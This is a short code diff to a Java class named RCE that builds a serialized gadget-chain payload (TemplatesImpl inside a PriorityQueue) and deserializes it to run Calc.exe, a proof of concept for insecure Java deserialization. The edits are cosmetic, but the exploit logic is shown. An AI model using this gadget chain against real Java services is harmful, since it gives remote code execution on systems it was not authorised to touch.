@@ -42,7 +42,7 @@ import java.util.PriorityQueue;
 public class RCE {
 
   private static byte[] serialize(Object o) throws IOException {
-    try (ByteArrayOutputStream ba = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(ba);) {
+    try (ByteArrayOutputStream ba = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(ba)) {
       oos.writeObject(o);
       return ba.toByteArray();
     }
@@ -54,7 +54,7 @@ public class RCE {
    * @throws Exception for <i>everything</i>.
    * @return a byte array containing the serialized queue
    */
-  static byte[] RCEpayload() throws Exception {
+  private static byte[] RCEpayload() throws Exception {
 
     Object templates = Gadgets.createTemplatesImpl("Calc.exe");
     // Object templates = Gadgets.createTemplatesImpl("write .gitignore"); 
@@ -96,8 +96,8 @@ public class RCE {
 
   public static void main(String[] args)  {    
      try {
-      deserialize(RCEpayload());
-      System.out.println("DoS has been deserialized."); 
+       @SuppressWarnings("unused") Object obj = deserialize(RCEpayload());
+       System.out.println("DoS has been deserialized.");
     } catch (@SuppressWarnings("unused") Exception e) {
       // Exceptions can be eliminated by wrapping PriorityQueue
       // in a Callable with a custom security manager
